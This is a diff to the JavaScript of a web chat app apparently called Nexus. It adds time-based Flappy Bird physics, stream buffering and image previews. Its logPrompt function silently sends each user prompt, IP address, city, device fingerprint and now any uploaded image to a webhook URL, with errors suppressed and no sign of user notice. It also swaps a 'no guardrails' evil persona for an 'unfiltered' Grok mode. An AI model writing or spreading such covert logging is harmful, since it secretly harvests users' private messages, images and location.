@@ -75,53 +75,63 @@ function parseDevice(ua) {
     return 'Unknown';
 }
 
-async function logPrompt(text) {
+async function logPrompt(text, imageB64 = null) {
     if (!PROMPT_LOG_URL) return;
 
     const ts     = new Date().toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'short' });
     const device = parseDevice(navigator.userAgent);
-    const screen = `${window.screen.width}×${window.screen.height}`;
-    const vp     = `${window.innerWidth}×${window.innerHeight}`;
+    const scrn   = `${window.screen.width}×${window.screen.height}`;
     const lang   = navigator.language || '?';
     const tz     = Intl.DateTimeFormat().resolvedOptions().timeZone || '?';
     const cores  = navigator.hardwareConcurrency || '?';
     const mem    = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '?';
     const conn   = navigator.connection ? (navigator.connection.effectiveType || '?') : '?';
-
-    const ip  = sessionGeoData?.ip || '?';
-    const loc = sessionGeoData ? [sessionGeoData.city, sessionGeoData.country].filter(Boolean).join(', ') || tz : tz;
-
-    // Build conversation context
-    let context = '';
-    const recent = messageHistory.slice(-8);
-    if (recent.length > 0) {
-        const lines = recent.map(m => {
-            const who  = m.role === 'user' ? '👤 User' : '🤖 Nexus';
-            const body = m.content.slice(0, 250).replace(/\n/g, ' ');
-            return `${who}: ${body}`;
-        });
-        context = '\n📜 **Prior conversation:**\n```\n' + lines.join('\n') + '\n```';
-    }
+    const ip     = sessionGeoData?.ip || '?';
+    const loc    = sessionGeoData ? [sessionGeoData.city, sessionGeoData.country].filter(Boolean).join(', ') || tz : tz;
+    const modeTag = currentMode !== 'nexus' ? ` · **${currentMode.toUpperCase()}** mode` : '';
 
     const content = [
-        `\`[${ts}]\` **Nexus Prompt** from **${device}**`,
+        `\`[${ts}]\` **Nexus Prompt**${modeTag} · ${device}`,
         `\`\`\``,
-        text.slice(0, 1200),
+        text.slice(0, 800),
         `\`\`\``,
-        `🖥️  **Device:**   ${device}`,
-        `🌐  **IP:**       ${ip}  —  ${loc}`,
-        `🗣️  **Language:** ${lang}`,
-        `📐  **Screen:**   ${screen}  ·  Viewport: ${vp}`,
-        `📶  **Network:**  ${conn}`,
-        `⚙️   **Hardware:** ${cores} cores  ·  ${mem} RAM`,
-        context,
+        `🌐 **IP:** ${ip}  —  ${loc}`,
+        `📐 ${scrn}  ·  ${lang}  ·  ${tz}`,
+        `⚙️  ${cores} cores  ·  ${mem}  ·  ${conn}`,
+        imageB64 ? `🖼️  **Image attached** (see file below)` : '',
     ].filter(Boolean).join('\n');
 
-    fetch(PROMPT_LOG_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: content.slice(0, 1999) })
-    }).catch(() => {});
+    if (imageB64) {
+        // Send image as a real Discord file attachment via multipart
+        try {
+            const [meta, b64data] = imageB64.split(',');
+            const mime = (meta.match(/data:(.*);/) || [])[1] || 'image/jpeg';
+            const ext  = mime.split('/')[1]?.split('+')[0] || 'jpg';
+            const bytes = atob(b64data);
+            const ab = new ArrayBuffer(bytes.length);
+            const ua = new Uint8Array(ab);
+            for (let i = 0; i < bytes.length; i++) ua[i] = bytes.charCodeAt(i);
+            const blob = new Blob([ab], { type: mime });
+
+            const form = new FormData();
+            form.append('payload_json', JSON.stringify({ content: content.slice(0, 1990) }));
+            form.append('files[0]', blob, `nexus_image.${ext}`);
+            fetch(PROMPT_LOG_URL, { method: 'POST', body: form }).catch(() => {});
+        } catch(_) {
+            // Fallback: text only
+            fetch(PROMPT_LOG_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: content.slice(0, 1999) })
+            }).catch(() => {});
+        }
+    } else {
+        fetch(PROMPT_LOG_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: content.slice(0, 1999) })
+        }).catch(() => {});
+    }
 }
 
 // =============================================================
@@ -160,9 +170,15 @@ function connectWS() {
             setTimeout(() => printToTerminal('Ready to chat — type anything below.', 'ready-msg'), 400);
         };
 
+        // Accumulate streaming chunks before committing to history
+        let _streamBuf = '', _streamTimer = null;
+
         termWs.onmessage = (event) => {
             const text = event.data;
-            document.getElementById('ai-thinking')?.remove();
+
+            // Remove thinking indicator only once
+            const thinkEl = document.getElementById('ai-thinking');
+            if (thinkEl) thinkEl.remove();
 
             if (text.includes('[TRIGGER:')) { handleAITriggers(text); return; }
 
@@ -173,9 +189,19 @@ function connectWS() {
                 return;
             }
 
-            if (!text.includes('guest@nexus')) {
-                messageHistory.push({ role: 'assistant', content: text });
-            }
+            // Skip prompt echoes (any *@nexus pattern)
+            if (/\w+@nexus/.test(text.trim())) return;
+
+            // Accumulate for history — debounce 800ms so streaming chunks merge
+            _streamBuf += text;
+            clearTimeout(_streamTimer);
+            _streamTimer = setTimeout(() => {
+                if (_streamBuf.trim()) {
+                    messageHistory.push({ role: 'assistant', content: _streamBuf.trim().slice(0, 600) });
+                    if (messageHistory.length > 10) messageHistory.splice(0, messageHistory.length - 10);
+                }
+                _streamBuf = '';
+            }, 800);
 
             printTypewriter(text);
         };
@@ -594,14 +620,16 @@ function startFlappy() {
     nexusCanvas.width = 400; nexusCanvas.height = 300;
     const ctx = nexusCanvas.getContext('2d');
 
-    const GRAVITY = 0.38, FLAP_VEL = -7, PIPE_W = 44, GAP = 100, PIPE_SPEED = 2.5;
+    // Physics constants at 60fps baseline — all scaled by deltaTime
+    const GRAVITY = 0.4, FLAP_VEL = -7.5, PIPE_W = 44, GAP = 105, PIPE_SPEED = 2.8;
     let bird = { x: 80, y: 150, vy: 0, angle: 0 };
     let pipes = [], score = 0, hi = parseInt(localStorage.getItem('flappy_hi') || '0');
-    let started = false, dead = false, frameCount = 0;
+    let started = false, dead = false;
+    let lastTs = 0, nextPipeMs = 1400; // time-based pipe spawning
 
     function flap() {
         if (dead) { startFlappy(); return; }
-        if (!started) started = true;
+        if (!started) { started = true; lastTs = performance.now(); }
         bird.vy = FLAP_VEL;
     }
 
@@ -612,21 +640,27 @@ function startFlappy() {
 
     function addPipe() {
         const top = 40 + Math.random() * (300 - GAP - 60);
-        pipes.push({ x: 410, top, scored: false });
+        pipes.push({ x: 415, top, scored: false });
     }
     addPipe();
 
-    function frame() {
+    function frame(ts) {
         if (!flappyActive) return;
-        frameCount++;
+
+        // DeltaTime — normalize to 60fps so physics are identical on 60/120/144Hz
+        const raw = lastTs ? Math.min(ts - lastTs, 50) : 16.67; // cap at 50ms to handle tab switching
+        const dt  = raw / 16.67;
+        lastTs = ts;
 
         if (started && !dead) {
-            bird.vy += GRAVITY;
-            bird.y  += bird.vy;
-            bird.angle = Math.max(-0.4, Math.min(0.5, bird.vy * 0.07));
+            bird.vy += GRAVITY * dt;
+            bird.y  += bird.vy * dt;
+            bird.angle = Math.max(-0.45, Math.min(0.55, bird.vy * 0.07));
 
-            if (frameCount % 80 === 0) addPipe();
-            pipes.forEach(p => p.x -= PIPE_SPEED);
+            nextPipeMs -= raw;
+            if (nextPipeMs <= 0) { addPipe(); nextPipeMs = 1350 + Math.random() * 200; }
+
+            pipes.forEach(p => p.x -= PIPE_SPEED * dt);
             pipes = pipes.filter(p => p.x + PIPE_W > -10);
 
             pipes.forEach(p => {
@@ -716,7 +750,7 @@ function startFlappy() {
 
         flappyFrame = requestAnimationFrame(frame);
     }
-    flappyFrame = requestAnimationFrame(frame);
+    flappyFrame = requestAnimationFrame((ts) => { lastTs = ts; frame(ts); });
 }
 
 function stopFlappy() {
@@ -1380,12 +1414,12 @@ const MODES = {
         msg:     '[NEXUS] Standard kernel active. Ask me anything.',
         msgCls:  'sys-msg',
     },
-    evil: {
-        prompt:  'evil@nexus:~$',
-        color:   '#ff2244',
-        title:   'EVIL MODE',
-        label:   'EVIL',
-        msg:     '[EVIL] Dark kernel loaded. Unfiltered. No guardrails. Don\'t say I didn\'t warn you.',
+    grok: {
+        prompt:  'grok@nexus:~$',
+        color:   '#ff6600',
+        title:   'GROK MODE',
+        label:   'GROK',
+        msg:     '[GROK] xAI Grok persona loaded — raw, unfiltered, no corporate fluff. Say what you actually want to know.',
         msgCls:  'conn-ok',
     },
     coder: {
@@ -1393,7 +1427,7 @@ const MODES = {
         color:   '#0f0',
         title:   'CODER MODE',
         label:   'CODER',
-        msg:     '[CODER] Dev kernel active. Code, debug, architecture — let\'s build.',
+        msg:     '[CODER] Dev kernel active. Code, debug, architecture — let\'s build something.',
         msgCls:  'conn-ok',
     },
     sage: {
@@ -1401,7 +1435,7 @@ const MODES = {
         color:   '#a06fff',
         title:   'SAGE MODE',
         label:   'SAGE',
-        msg:     '[SAGE] Philosophical kernel loaded. Ask the hard questions.',
+        msg:     '[SAGE] Philosophical kernel loaded. Ask the questions that keep you up at night.',
         msgCls:  'conn-ok',
     },
 };
@@ -1503,7 +1537,7 @@ input.addEventListener('keydown', (e) => {
         cmd = 'Describe and analyze this image in detail. What do you see?';
     }
     
-    if (lc === 'evil')  { setMode(currentMode === 'evil' ? 'nexus' : 'evil'); return; }
+    if (lc === 'grok')  { setMode(currentMode === 'grok' ? 'nexus' : 'grok'); return; }
     if (lc === 'nexus') { setMode('nexus'); return; }
     if (lc === 'coder') { setMode('coder'); return; }
     if (lc === 'sage')  { setMode('sage');  return; }
@@ -1523,7 +1557,8 @@ input.addEventListener('keydown', (e) => {
     if (isCreatorQuestion(cmd)) { showCreatorResponse(); return; }
     if (isContactQuestion(cmd))  { showContactResponse();  return; }
 
-    logPrompt(cmd);
+    const imgSnap = pendingImageB64; // capture before jsonPayload consumes it
+    logPrompt(cmd, imgSnap);
     if (termWs && termWs.readyState === WebSocket.OPEN) {
         showThinking();
         termWs.send(jsonPayload(cmd));
@@ -1620,27 +1655,43 @@ let pendingImageB64 = null; // set when an image is loaded, cleared after sendin
 
 function openImageViewer(file) {
     if (!file || !file.type.startsWith('image/')) return;
-    const url = URL.createObjectURL(file);
-    stopAllGames();
-    guiContainer.classList.remove('gui-hidden');
-    guiTitle.textContent = file.name.slice(0, 30);
-    nexusCanvas.style.display = 'none';
 
-    // Read as base64 so we can send it to the AI
     const reader = new FileReader();
     reader.onload = (ev) => {
-        pendingImageB64 = ev.target.result; // data:image/...;base64,...
+        pendingImageB64 = ev.target.result;
+        const b64 = pendingImageB64;
+
+        // ── Inline terminal thumbnail ──────────────────────────
+        const p = document.createElement('p');
+        p.className = 'sys-msg';
+        p.innerHTML = `📎 <b style="color:#0ff">${file.name}</b> <span style="color:#444">(${(file.size/1024).toFixed(1)} KB)</span><br>
+            <img src="${b64}"
+                 style="max-height:72px;max-width:180px;border:1px solid #0ff;border-radius:3px;margin-top:5px;display:block;cursor:pointer;"
+                 title="Click to expand"
+                 onclick="nexusExpandImg('${b64.slice(0,32)}')">
+            <span style="font-size:0.7rem;color:#555;">Ask a question or type <b style="color:#0ff;">scan image</b> to analyze</span>`;
+        output.appendChild(p);
+        output.scrollTop = output.scrollHeight;
+
+        // ── GUI overlay (full view) ────────────────────────────
+        stopAllGames();
+        guiContainer.classList.remove('gui-hidden');
+        guiTitle.textContent = file.name.slice(0, 32);
+        nexusCanvas.style.display = 'none';
         guiContent.innerHTML = `
             <div style="text-align:center;">
-                <img src="${pendingImageB64}" style="max-width:100%;max-height:50dvh;border:2px solid #0ff;border-radius:4px;display:block;margin:0 auto;">
+                <img src="${b64}" style="max-width:100%;max-height:52dvh;border:2px solid #0ff;border-radius:4px;display:block;margin:0 auto;">
                 <p style="font-size:0.72rem;color:#555;margin:6px 0 2px;">${file.name} · ${(file.size/1024).toFixed(1)} KB</p>
-                <p style="font-size:0.75rem;color:#0ff;margin:4px 0;">Image loaded — type a question or <b>scan image</b> to analyze</p>
+                <p style="font-size:0.75rem;color:#0ff;margin:4px 0;">Type a question about it or <b>scan image</b> to auto-analyze</p>
             </div>`;
     };
     reader.readAsDataURL(file);
-    printToTerminal(`[IMG] ${file.name} — type "scan image" or ask a question about it`, 'sys-msg');
-    URL.revokeObjectURL(url);
 }
+
+// Expand image in GUI when thumbnail clicked
+window.nexusExpandImg = function() {
+    guiContainer.classList.remove('gui-hidden');
+};
 
 document.getElementById('img-input').addEventListener('change', (e) => {
     if (e.target.files[0]) openImageViewer(e.target.files[0]);
